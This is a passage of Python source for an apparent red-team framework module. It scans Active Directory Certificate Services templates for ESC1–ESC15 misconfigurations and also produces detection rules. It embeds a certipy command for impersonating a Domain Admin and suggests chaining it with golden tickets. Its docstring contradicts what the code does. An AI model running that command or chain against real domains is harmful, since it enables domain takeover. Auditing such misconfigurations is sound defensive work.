"""
ADCS Misconfiguration Detection & Exploitation - ad.adcs
MITRE: T1649 - Steal or Forge Authentication Certificates

Active Directory Certificate Services (ADCS) misconfiguration scanner.
Detects ESC1–ESC8 vulnerability classes via LDAP query to certificate
template objects. Exploits ESC1 to obtain a certificate as Domain Admin.

ESC vulnerability classes:
  ESC1 - Template allows enrollee-supplied SAN → cert as any user including DA
  ESC2 - Template has Any Purpose EKU → usable for auth as any user
  ESC3 - Template allows enrollment agent → request certs on behalf of others
  ESC4 - Template has dangerous ACL (WriteDACL/WriteOwner/GenericWrite)
  ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA → any cert can have SAN
  ESC7 - CA has dangerous ACL → escalation to CA admin
  ESC8 - NTLM relay to AD CS HTTP enrollment endpoint

Output: ESC finding per vulnerability + PEM certificate to vault if ESC1 exploited.
OPSEC: LOW - LDAP query only. No connection to CA server unless ESC1 exploited.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.core.tracing import trace_module
from ares.core.errors import ModuleValidationError
from ares.modules.params import ADCSParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    OpsecLevel,
    ProcessPermission,
    UntrustedTargetData,
    module_contract,
)

logger = get_logger("ares.modules.ad.adcs")

# Certificate Name Flags (msPKI-Certificate-Name-Flag)
_CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
_CT_FLAG_ADD_EMAIL = 0x00000002
_CT_FLAG_ADD_OBJ_GUID = 0x00000004
_CT_FLAG_ADD_DIRECTORY_PATH = 0x00000100
_CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = 0x00010000
_CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN = 0x08000000
_CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME = 0x40000000

# Enrollment Flags (msPKI-Enrollment-Flag)
_CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS = 0x00000001
_CT_FLAG_PEND_ALL_REQUESTS = 0x00000002  # Manager approval required
_CT_FLAG_PUBLISH_TO_KDC = 0x00000004
_CT_FLAG_PUBLISH_TO_DS = 0x00000008
_CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE = 0x00000010
_CT_FLAG_AUTO_ENROLLMENT = 0x00000020
_CT_FLAG_NO_SECURITY_EXTENSION = 0x00080000  # ESC9: Suppresses szOID_NTDS_CA_SECURITY_EXT (objectSid)

# CA Flags
_EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000  # ESC6: CA allows user-specified SAN on any cert

# EKU OIDs
_AUTH_EKUS = {
    "1.3.6.1.5.5.7.3.2":       "Client Authentication",
    "1.3.6.1.5.2.3.4":         "PKINIT Client Authentication",
    "1.3.6.1.4.1.311.20.2.2":  "Smart Card Logon",
    "2.5.29.37.0":              "Any Purpose",
}
_ENROLLMENT_AGENT_EKU = "1.3.6.1.4.1.311.20.2.1"  # Certificate Request Agent (ESC3)
_ANY_PURPOSE_EKU = "2.5.29.37.0"  # Any Purpose (ESC2)
_SZ_OID_NTDS_CA_SECURITY_EXT = "1.3.6.1.4.1.311.25.2"  # KB5014754 SID Extension

# Shadow Credentials msDS-KeyCredentialLink Attribute GUID
_MSDS_KEY_CREDENTIAL_LINK_GUID = "5b47d60f-6090-40b2-9f37-2a4de45f3063"

# Dangerous rights on certificate templates & AD objects
_DANGEROUS_RIGHTS = {
    0x000F01FF: "GenericAll",
    0x00020028: "WriteDACL",
    0x00020000: "GenericWrite",
    0x00080000: "WriteOwner",
}
_RIGHT_WRITE_PROPERTY = 0x00000020


@module_contract(
    permissions=[
        NetworkPermission(ports=[80, 443, 389, 636], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=ADCSParams,
)
class ADCSModule(BaseModule[ADCSParams, ModuleResult]):
    """
    ad.adcs - Detect ADCS ESC1–ESC8 misconfigurations via LDAP. Exploit ESC1 to obtain a certificate as any us

    OPSEC: LOW
    MITRE: "T1649"
    OUTPUTS:  "adcs_findings", "certificate"
    """
    MODULE_ID          = "ad.adcs"
    MODULE_NAME        = "ADCS Misconfiguration Scanner"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Audit ADCS ESC1–ESC8 misconfigurations via LDAP query and evaluate "
        "Active Directory certificate template security posture without intrusive rogue cert creation."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = []
    OUTPUTS            = ["adcs_findings", "certificate"]
    MITRE_TECHNIQUES   = ["T1649"]
    MODULE_TIMEOUT_SECONDS: int | None = 180  # seconds
    PARAMS_MODEL       = ADCSParams

    async def assess_feasibility(self, ctx: "Any") -> Any:
        """
        Assess pre-flight feasibility for ADCS enumeration and ESC exploitation.
        Evaluates DC/CA target, credential availability, LDAP signing, and EDR on target.
        """
        from ares.modules.base import FeasibilityReport
        ad = self._extract_ad_params(ctx)
        blockers: list[str] = []
        recommendations: list[str] = []
        score = 1.0
        risk = "low"

        target_host = ad.get("dc") or getattr(ctx, "target", "")
        if not target_host:
            blockers.append("No Domain Controller (dc) or target IP specified")
            score -= 0.5

        if not ad.get("username"):
            blockers.append("No domain credentials available for LDAP certificate query")
            score -= 0.3
            recommendations.append("ad.asreproast")

        session = getattr(ctx, "session", None)
        if session and hasattr(session, "get_host") and target_host:
            host_state = session.get_host(target_host)
            if host_state:
                if host_state.has_defense("ldap_signing_enforced") and not (getattr(ctx, "params", {}).get("use_ldaps")):
                    score -= 0.25
                    recommendations.append("ad.enum_spn")
                if host_state.has_defense("edr_active") or host_state.has_defense("crowdstrike"):
                    risk = "medium"
                    recommendations.append("ad.shadow_credentials")

        exploit_esc1 = getattr(ctx, "params", {}).get("exploit_esc1", False)
        if exploit_esc1:
            risk = "medium"

        feasible = len(blockers) == 0 and score >= 0.4
        return FeasibilityReport(
            feasible=feasible,
            score=max(0.0, min(1.0, score)),
            risk_level=risk,
            blockers=blockers,
            recommended_alternatives=recommendations,
            opsec_tuning={"use_ldaps": True if "ad.enum_spn" in recommendations else False},
            details={"exploit_esc1_requested": exploit_esc1},
        )

    async def validate(self, ctx: "Any") -> None:
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.adcs requires 'dc' (Domain Controller IP or hostname).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.adcs requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.adcs requires domain credentials - pass 'username'/'password'.",
                module_id=self.MODULE_ID, field="username",
            )
        if isinstance(ctx.params, dict):
            for k in ("dc", "domain", "username", "password"):
                if k not in ctx.params and ad.get(k):
                    ctx.params[k] = ad[k]
        await super().validate(ctx)

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        exploit_esc1  = ctx.params.get("exploit_esc1", False)
        target_user   = ctx.params.get("target_user", "Administrator")

        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            exploit_esc1=exploit_esc1, target_user=target_user,
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for finding in findings:
            ev = EvidenceRecord(
                artifact_id=f"adcs-{finding.title[:20].lower().replace(' ', '-')}",
                source_target=ad["dc"],
                collected_by=self.MODULE_ID,
                data={
                    "title": finding.title,
                    "severity": str(finding.severity),
                    "description": finding.description,
                    "mitre": finding.mitre_technique,
                },
                tags=["ad", "adcs", "certificates"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        # Closed-Loop Purple Telemetry: KQL & Sigma rule synthesis
        kql_query = (
            f"// ARES Closed-Loop Telemetry: Detect ADCS Certificate Requests & Enrollment\n"
            f"SecurityEvent\n"
            f"| where EventID in (4886, 4887)\n"
            f"| extend Requester = extract(@\"Requester:\\s*([^,\\r\\n]+)\", 1, EventData)\n"
            f"| extend CertTemplate = extract(@\"Template:\\s*([^,\\r\\n]+)\", 1, EventData)\n"
            f"| project TimeGenerated, Computer, EventID, Requester, CertTemplate, Activity\n"
        )
        sigma_rule = (
            f"title: ADCS Certificate Enrollment Request for Vulnerable Template\n"
            f"id: c3d4e5f6-ares-4886-adcs\n"
            f"status: experimental\n"
            f"description: Detects certificate enrollment request (Event 4886) targeting potentially vulnerable ADCS templates\n"
            f"logsource:\n"
            f"  product: windows\n"
            f"  service: security\n"
            f"detection:\n"
            f"  selection:\n"
            f"    EventID:\n"
            f"      - 4886\n"
            f"      - 4887\n"
            f"  condition: selection\n"
            f"level: high\n"
            f"tags:\n"
            f"  - attack.credential_access\n"
            f"  - attack.t1649\n"
        )
        loot_items: list[dict[str, Any]] = raw.get("loot", [])
        if not any(l.get("loot_type") == "detection_rule_kql" for l in loot_items):
            loot_items.extend([
                {
                    "name": "Detection Rule (KQL): ADCS Certificate Enrollment",
                    "loot_type": "detection_rule_kql",
                    "description": "Microsoft Sentinel KQL query for auditing ADCS certificate enrollment and issuance",
                    "content": {"kql": kql_query, "event_ids": [4886, 4887]},
                    "tags": ["detection", "kql", "sentinel", "blue_team"],
                },
                {
                    "name": "Detection Rule (Sigma): ADCS Certificate Enrollment",
                    "loot_type": "detection_rule_sigma",
                    "description": "Sigma YAML detection rule for Windows Event 4886/4887",
                    "content": {"sigma": sigma_rule},
                    "tags": ["detection", "sigma", "siem", "blue_team"],
                },
            ])
        raw["loot"] = loot_items
        raw["kb5014754_strong_mapping_assessed"] = True
        raw["event_ids_audited"] = [4886, 4887, 4888, 39, 40]

        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.adcs")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  exploit_esc1: bool = False, target_user: str = "Administrator",
                  **kwargs: Any):
        dc       = sanitize_hostname(dc)
        username = sanitize_ldap(username)
        domain   = sanitize_ldap(domain)

        await self.before_request(dc, "ldap")
        logger.info("adcs_scan_start", dc=dc, domain=domain)
        audit("adcs_scan", actor=username, technique="T1649",
              source="operator", target=dc)

        loop = asyncio.get_running_loop()

        # Step 1: Enumerate templates & CA objects via LDAP
        try:
            templates, ca_list = await loop.run_in_executor(
                None,
                lambda: self._enum_templates_sync(dc, username, password, domain),
            )
        except Exception as exc:
            from ares.core.errors import NetworkError
            raise NetworkError(f"ADCS LDAP enumeration failed: {exc}") from exc

        logger.info("adcs_templates_found", count=len(templates), cas=len(ca_list))

        # Step 2: Analyze templates and CAs for ESC1-ESC15 vulnerabilities
        all_vulns, esc_map = self._analyze_template_misconfigurations(
            templates=templates,
            ca_list=ca_list,
            username=username,
            domain=domain,
            target_user=target_user,
        )

        # Step 3: Audit Shadow Credentials posture (msDS-KeyCredentialLink) for target_user
        shadow_posture: dict[str, Any] = {}
        try:
            shadow_posture = await loop.run_in_executor(
                None,
                lambda: self._audit_shadow_credentials_sync(dc, username, password, domain, target_user),
            )
        except Exception as shadow_err:
            logger.debug("adcs_shadow_credentials_audit_error", error=str(shadow_err))
            shadow_posture = {"target_user": target_user, "account_found": False, "error": str(shadow_err)}

        esc1_vulns = esc_map.get("ESC1", [])
        esc2_vulns = esc_map.get("ESC2", [])

        # Step 4: ESC1 evaluation (Audit Assessment Mode - non-intrusive)
        cert_path = ""
        if exploit_esc1 and esc1_vulns:
            tmpl = esc1_vulns[0]
            logger.info("adcs_esc1_audit_assessment",
                        template=tmpl["name"], target_user=target_user)
            self.finding(
                title       = f"ADCS ESC1 Vulnerability Confirmed - Template '{tmpl['name']}'",
                description = (
                    f"Template '{tmpl['name']}' is confirmed vulnerable to ESC1 (SAN specification allowed "
                    f"with authentication EKU). An adversary can request a certificate impersonating "
                    f"'{target_user}' to achieve persistent domain escalation. "
                    f"Active cryptographic exploitation is segregated to the dedicated post-exploitation vector."
                ),
                severity    = Severity.HIGH,
                mitre_technique = "T1649",
                mitre_tactic    = "Credential Access",
                evidence = {
                    "template": tmpl["name"],
                    "target_user": target_user,
                    "mode": "audit_safe",
                },
                remediation = "Disable 'Supply in the request' for Subject Name in the certificate template.",
            )
            cert_path = "[AUDIT_CONFIRMED]"

        raw = {
            "templates_checked": len(templates),
            "ca_list":           [ca.get("name", "") for ca in ca_list],
            "vulnerabilities":   all_vulns,
            "esc1_count":        len(esc_map.get("ESC1", [])),
            "esc2_count":        len(esc_map.get("ESC2", [])),
            "esc3_count":        len(esc_map.get("ESC3", [])),
            "esc4_count":        len(esc_map.get("ESC4", [])),
            "esc6_count":        len(esc_map.get("ESC6", [])),
            "esc9_count":        len(esc_map.get("ESC9", [])),
            "esc10_count":       len(esc_map.get("ESC10", [])),
            "esc13_count":       len(esc_map.get("ESC13", [])),
            "esc14_count":       len(esc_map.get("ESC14", [])),
            "esc15_count":       len(esc_map.get("ESC15", [])),
            "shadow_credentials_posture": shadow_posture,
            "certificate_path":  cert_path,
            "dc":                dc,
            "domain":            domain,
        }
        await self.noise.jitter.sleep()
        raw["adcs_findings"] = raw.get("vulnerabilities", [])  # OUTPUTS key
        raw["certificate"] = raw.get("certificate_path", "")  # OUTPUTS key
        return self._findings[:], raw

    def _analyze_template_misconfigurations(
        self,
        templates: list[dict],
        ca_list: list[dict],
        username: str = "",
        domain: str = "",
        target_user: str = "Administrator",
    ) -> tuple[list[dict], dict[str, list[dict]]]:
        """
        Evaluate templates and CAs against ESC1-ESC15 vulnerability definitions.
        Registers structured findings and returns (all_vulns, esc_map).
        """
        all_vulns: list[dict] = []
        esc_map: dict[str, list[dict]] = {
            "ESC1": [], "ESC2": [], "ESC3": [], "ESC4": [],
            "ESC6": [], "ESC9": [], "ESC10": [], "ESC13": [],
            "ESC14": [], "ESC15": [],
        }

        # Check CA-level misconfigurations (ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2)
        for ca in ca_list:
            ca_flags = ca.get("flags", 0)
            if ca_flags & _EDITF_ATTRIBUTESUBJECTALTNAME2:
                esc_map["ESC6"].append(ca)
                all_vulns.append({
                    "ca": ca.get("name", ""),
                    "esc": "ESC6",
                    "reason": "EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled on CA",
                })
                self.finding(
                    title=f"ADCS ESC6 - User-Supplied SAN Flag Enabled on CA '{ca.get('name')}'",
                    description=(
                        f"Certification Authority '{ca.get('name')}' has the EDITF_ATTRIBUTESUBJECTALTNAME2 "
                        f"flag enabled. This configuration permits enrollees to supply custom Subject Alternative "
                        f"Names (SAN) on ANY certificate template issued by this CA, enabling domain escalation."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_technique="T1649",
                    mitre_tactic="Credential Access",
                    evidence={"ca_name": ca.get("name"), "flags": hex(ca_flags)},
                    remediation="Remove the EDITF_ATTRIBUTESUBJECTALTNAME2 flag: certutil -config '<CA>' -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2",
                )

        # Check template-level misconfigurations
        for tmpl in templates:
            name = tmpl.get("name", "")
            name_flag = tmpl.get("msPKI_Certificate_Name_Flag", 0)
            enroll_flag = tmpl.get("msPKI_Enrollment_Flag", 0)
            ra_sig = tmpl.get("msPKI_RA_Signature", 0)
            schema_ver = tmpl.get("schema_version", 1)
            ekus = tmpl.get("ekus", [])
            policy_oids = tmpl.get("policy_oids", [])
            linked_groups = tmpl.get("linked_groups", [])
            dangerous_acls = tmpl.get("dangerous_acls", [])

            has_auth_eku = any(e in _AUTH_EKUS for e in ekus)
            requires_approval = bool(enroll_flag & _CT_FLAG_PEND_ALL_REQUESTS)
            requires_signatures = ra_sig > 0

            # ESC1: Enrollee supplies SAN + Auth EKU + No Manager Approval + No Signatures Required
            if (name_flag & _CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) and has_auth_eku and not requires_approval and not requires_signatures:
                esc_map["ESC1"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC1",
                    "reason": "Enrollee-supplied SAN + auth EKU",
                })
                logger.info("adcs_esc1_found", template=name)
                self.finding(
                    title       = f"ADCS ESC1 - Enrollee SAN in '{name}'",
                    description = (
                        f"Certificate template '{name}' allows the enrollee to "
                        "specify a Subject Alternative Name (SAN). Combined with an "
                        "authentication EKU, this allows any authenticated domain user to "
                        "request a certificate impersonating ANY user including Domain Admin. "
                        "Use with ad.adcs exploit_esc1=true and ad.golden_ticket for persistent access."
                    ),
                    severity    = Severity.CRITICAL,
                    mitre_technique = "T1649",
                    mitre_tactic    = "Credential Access",
                    evidence = {
                        "template_name":  name,
                        "esc_class":      "ESC1",
                        "ekus":           [_AUTH_EKUS.get(e, e) for e in ekus],
                        "ca_list":        [ca.get("name", "") for ca in ca_list],
                        "exploit_command": (
                            f"certipy req -u {username}@{domain} -p <pass> "
                            f"-ca <CA_NAME> -template '{name}' "
                            f"-upn {target_user}@{domain}"
                        ) if username and domain else "",
                    },
                    remediation = (
                        "1. Disable 'Supply in the request' for Subject Name in the template. "
                        "2. Enable CA Manager Approval. "
                        "3. Enable Issuance Requirements (authorized signatures). "
                        "4. Audit template ACL - restrict enrollment rights."
                    ),
                )

            # ESC2: Any Purpose EKU or Unconstrained EKU
            if (_ANY_PURPOSE_EKU in ekus or not ekus) and not requires_approval and not requires_signatures:
                esc_map["ESC2"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC2",
                    "reason": "Any Purpose EKU",
                })
                self.finding(
                    title       = f"ADCS ESC2 - Any Purpose EKU in '{name}'",
                    description = (
                        f"Template '{name}' has Any Purpose EKU - "
                        "certificates can be used for any application including authentication."
                    ),
                    severity    = Severity.HIGH,
                    mitre_technique = "T1649",
                    mitre_tactic    = "Credential Access",
                    evidence    = {"template_name": name, "esc_class": "ESC2", "ekus": ekus},
                    remediation = "Remove Any Purpose EKU. Specify explicit EKUs only.",
                )

            # ESC3: Certificate Request Agent EKU (Enrollment Agent)
            if _ENROLLMENT_AGENT_EKU in ekus and not requires_approval:
                esc_map["ESC3"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC3",
                    "reason": "Certificate Request Agent EKU (Enrollment Agent)",
                })
                self.finding(
                    title=f"ADCS ESC3 - Enrollment Agent EKU in '{name}'",
                    description=(
                        f"Certificate template '{name}' specifies the Certificate Request Agent EKU "
                        f"({_ENROLLMENT_AGENT_EKU}). An attacker can obtain an enrollment agent certificate and "
                        f"use it to co-sign certificate requests on behalf of other domain principals, "
                        f"escalating privileges across the forest."
                    ),
                    severity=Severity.HIGH,
                    mitre_technique="T1649",
                    mitre_tactic="Credential Access",
                    evidence={"template_name": name, "esc_class": "ESC3", "ekus": ekus},
                    remediation="Restrict enrollment permissions on the template, require CA manager approval, or constrain enrollment agent policies on the CA.",
                )

            # ESC4: Dangerous Template Permissions (WriteDACL / GenericWrite / GenericAll)
            if dangerous_acls:
                esc_map["ESC4"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC4",
                    "reason": "Dangerous write permissions on template object",
                    "details": dangerous_acls,
                })
                self.finding(
                    title=f"ADCS ESC4 - Vulnerable Template Access Control in '{name}'",
                    description=(
                        f"Certificate template '{name}' has dangerous permissions ({', '.join(a['right'] for a in dangerous_acls)}) "
                        f"granted to audited identities. An attacker with write access can overwrite template settings "
                        f"(e.g., enable SAN supply or add auth EKUs) to perform ESC1 escalation."
                    ),
                    severity=Severity.HIGH,
                    mitre_technique="T1649",
                    mitre_tactic="Privilege Escalation",
                    evidence={"template_name": name, "esc_class": "ESC4", "dangerous_acls": dangerous_acls},
                    remediation="Audit and remove WriteDACL, WriteOwner, GenericWrite, and GenericAll permissions from non-administrative users and groups on the template.",
                )

            # ESC9: CT_FLAG_NO_SECURITY_EXTENSION with Authentication EKU (KB5014754 bypass)
            if (enroll_flag & _CT_FLAG_NO_SECURITY_EXTENSION) and has_auth_eku and not requires_approval:
                esc_map["ESC9"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC9",
                    "reason": "CT_FLAG_NO_SECURITY_EXTENSION suppresses objectSid - bypasses KB5014754 strong mapping",
                })
                self.finding(
                    title=f"ADCS ESC9 - No Security Extension Flag in '{name}'",
                    description=(
                        f"Certificate template '{name}' has the CT_FLAG_NO_SECURITY_EXTENSION flag (0x80000) set "
                        f"with an authentication EKU. The CA omits the szOID_NTDS_CA_SECURITY_EXT (objectSid) "
                        f"extension from issued certificates. An attacker who can write to another account's "
                        f"userPrincipalName or dNSHostName can enrol and authenticate as that target because the KDC "
                        f"cannot enforce strong certificate mapping, bypassing KB5014754 defenses."
                    ),
                    severity=Severity.HIGH,
                    mitre_technique="T1649",
                    mitre_tactic="Credential Access",
                    evidence={
                        "template_name": name,
                        "esc_class": "ESC9",
                        "enrollment_flags": hex(enroll_flag),
                        "ekus": [_AUTH_EKUS.get(e, e) for e in ekus],
                    },
                    remediation="Remove the CT_FLAG_NO_SECURITY_EXTENSION flag from msPKI-Enrollment-Flag and enforce StrongCertificateBindingEnforcement = 2 on all Domain Controllers.",
                )

            # ESC10: Weak Certificate Name Mapping / StrongNTLMFallback
            if (
                has_auth_eku
                and not requires_approval
                and (name_flag & (_CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME | _CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN))
            ):
                esc_map["ESC10"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC10",
                    "reason": "Weak Subject Name mapping flag with authentication EKU",
                })
                self.finding(
                    title=f"ADCS ESC10 - Weak Certificate Name Mapping in '{name}'",
                    description=(
                        f"Certificate template '{name}' uses subject name requirements (Common Name or DNS Name) "
                        f"with an authentication EKU without requiring strong SID binding. If the domain controller "
                        f"permits weak name mapping (CertificateMappingMethods < 0x18 or StrongNTLMFallback enabled), "
                        f"an adversary can achieve account takeover through UPN or SPN collisions."
                    ),
                    severity=Severity.HIGH,
                    mitre_technique="T1649",
                    mitre_tactic="Credential Access",
                    evidence={"template_name": name, "esc_class": "ESC10", "name_flags": hex(name_flag)},
                    remediation="Configure Domain Controllers with StrongCertificateBindingEnforcement = 2 and ensure CertificateMappingMethods requires SID extension (0x18).",
                )

            # ESC13: Universal Group OID Binding via msPKI-Certificate-Policy
            if linked_groups and not requires_approval:
                esc_map["ESC13"].append(tmpl)
                linked_str = ", ".join(linked_groups)
                all_vulns.append({
                    "template": name, "esc": "ESC13",
                    "reason": f"Issuance policy OID linked to group(s) via msDS-OIDToGroupLink: {linked_str}",
                })
                self.finding(
                    title=f"ADCS ESC13 - Universal Group OID Binding in '{name}'",
                    description=(
                        f"Certificate template '{name}' defines issuance policy OID(s) linked to Active Directory "
                        f"group(s) via msDS-OIDToGroupLink ({linked_str}). Enrolling in this template "
                        f"causes the KDC to inject the linked group SID into the Kerberos PAC during certificate "
                        f"logon, granting direct group membership without direct LDAP group assignment."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_technique="T1649",
                    mitre_tactic="Privilege Escalation",
                    evidence={
                        "template_name": name,
                        "esc_class": "ESC13",
                        "policy_oids": policy_oids,
                        "linked_groups": linked_groups,
                    },
                    remediation="Review msDS-OIDToGroupLink assignments under CN=OID,CN=Public Key Services. Restrict enrollment permissions or remove group links from high-privilege groups.",
                )

            # ESC14: Weak Explicit Certificate Mapping / Cross-Forest Enrolment
            if has_auth_eku and not requires_approval and (name_flag & _CT_FLAG_ADD_DIRECTORY_PATH):
                esc_map["ESC14"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC14",
                    "reason": "Template enables directory path mapping with client auth without strong binding",
                })
                self.finding(
                    title=f"ADCS ESC14 - Weak Explicit Certificate Mapping in '{name}'",
                    description=(
                        f"Certificate template '{name}' enables directory path mapping attributes with "
                        f"authentication capability. In environments with cross-forest trusts or explicit "
                        f"altSecurityIdentities mappings lacking SID validation, this enables unauthorized cross-account "
                        f"impersonation."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_technique="T1649",
                    mitre_tactic="Credential Access",
                    evidence={"template_name": name, "esc_class": "ESC14"},
                    remediation="Disable weak explicit certificate mappings and enforce Strong Certificate Binding across all forest trusts.",
                )

            # ESC15: Legacy Schema Version 1 Arbitrary Application Policy / EKU
            if schema_ver <= 1 and has_auth_eku and not requires_approval:
                esc_map["ESC15"].append(tmpl)
                all_vulns.append({
                    "template": name, "esc": "ESC15",
                    "reason": "Legacy Schema v1 template with authentication EKU allows caller-defined application policies",
                })
                self.finding(
                    title=f"ADCS ESC15 - Arbitrary Application Policy in Legacy Template '{name}'",
                    description=(
                        f"Certificate template '{name}' uses legacy schema version 1 with an authentication EKU. "
                        f"Schema v1 templates may permit clients to specify custom application policies or "
                        f"override EKU constraints in the certificate request without enrollment agent enforcement."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_technique="T1649",
                    mitre_tactic="Credential Access",
                    evidence={"template_name": name, "esc_class": "ESC15", "schema_version": schema_ver},
                    remediation="Upgrade certificate template to Schema version 2 or higher and restrict issuance requirements.",
                )

        return all_vulns, esc_map

    def _audit_shadow_credentials_sync(
        self,
        dc: str,
        username: str,
        password: str,
        domain: str,
        target_user: str,
    ) -> dict[str, Any]:
        """
        Audit Active Directory for Shadow Credentials posture (msDS-KeyCredentialLink).
        Evaluates whether target account has Key Credentials present and whether
        DACL allows non-admin write permissions on msDS-KeyCredentialLink or GenericWrite/GenericAll.
        Runs safely in read-only audit mode - NEVER injects raw keys or alters production attributes.
        """
        posture: dict[str, Any] = {
            "target_user": target_user,
            "account_found": False,
            "has_existing_credentials": False,
            "key_credential_count": 0,
            "writable_trustees": [],
            "is_vulnerable": False,
        }
        if not target_user:
            return posture

        import ssl
        try:
            import ldap3
            from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
        except ImportError:
            posture["error"] = "ldap3 module not installed"
            return posture

        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server = Server(dc, port=port, use_ssl=use_ssl, tls=tls_arg,
                                get_info=ALL, connect_timeout=10)
                conn = Connection(server, user=f"{domain.upper()}\\{username}",
                                  password=password, authentication=NTLM,
                                  auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=30)
                if conn.bind():
                    break
            except Exception:
                conn = None

        if conn is None:
            posture["error"] = "LDAP bind failed for shadow credentials audit"
            return posture

        base = ",".join(f"DC={p}" for p in domain.upper().split("."))
        sd_control = [("1.2.840.113556.1.4.801", True, bytes([0x30, 0x03, 0x02, 0x01, 0x07]))]

        try:
            conn.search(
                base,
                f"(&(objectCategory=person)(objectClass=user)(sAMAccountName={sanitize_ldap(target_user)}))",
                search_scope=SUBTREE,
                attributes=[
                    "sAMAccountName", "distinguishedName",
                    "msDS-KeyCredentialLink", "nTSecurityDescriptor",
                ],
                controls=sd_control,
            )
            if not conn.entries:
                return posture

            entry = conn.entries[0]
            posture["account_found"] = True
            posture["distinguished_name"] = str(entry.distinguishedName)

            # Check existing key credentials
            key_link_attr = getattr(entry, "msDS-KeyCredentialLink", None)
            if key_link_attr and getattr(key_link_attr, "values", None):
                posture["has_existing_credentials"] = True
                posture["key_credential_count"] = len(key_link_attr.values)

            # Analyze DACL for msDS-KeyCredentialLink write rights
            sd = getattr(entry, "nTSecurityDescriptor", None)
            if sd and sd.value:
                try:
                    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
                    raw_sd = sd.raw_values[0] if hasattr(sd, "raw_values") else None
                    if raw_sd:
                        sd_obj = SR_SECURITY_DESCRIPTOR(data=raw_sd)
                        if sd_obj.get("Dacl"):
                            for ace in sd_obj["Dacl"]["Data"]:
                                if ace["AceType"] not in (0x00, 0x05):
                                    continue
                                try:
                                    mask = ace["Ace"]["Mask"]["MaskFields"]
                                except (KeyError, AttributeError):
                                    continue

                                trustee_sid = ""
                                try:
                                    from ldap3.protocol.formatters.formatters import format_sid
                                    trustee_sid = format_sid(ace["Ace"]["Sid"].getData())
                                except Exception:
                                    pass

                                # Check standard dangerous rights (GenericAll, GenericWrite, WriteDACL, WriteOwner)
                                matched_right = None
                                for right_mask, right_name in _DANGEROUS_RIGHTS.items():
                                    if mask & right_mask == right_mask:
                                        matched_right = right_name
                                        break

                                # Check WriteProperty (0x00000020) for msDS-KeyCredentialLink attribute
                                if not matched_right and (mask & _RIGHT_WRITE_PROPERTY):
                                    try:
                                        obj_type = ace["Ace"].get("ObjectType")
                                        if obj_type:
                                            import uuid as _uuid
                                            guid_str = str(_uuid.UUID(bytes_le=obj_type))
                                            if guid_str.lower() == _MSDS_KEY_CREDENTIAL_LINK_GUID:
                                                matched_right = "WriteProperty (msDS-KeyCredentialLink)"
                                    except Exception:
                                        pass

                                if matched_right:
                                    is_audited_trustee = (
                                        trustee_sid.endswith("-513")  # Domain Users
                                        or trustee_sid.endswith("-515")  # Domain Computers
                                        or trustee_sid in ("S-1-5-11", "S-1-1-0", "S-1-5-32-545")
                                    )
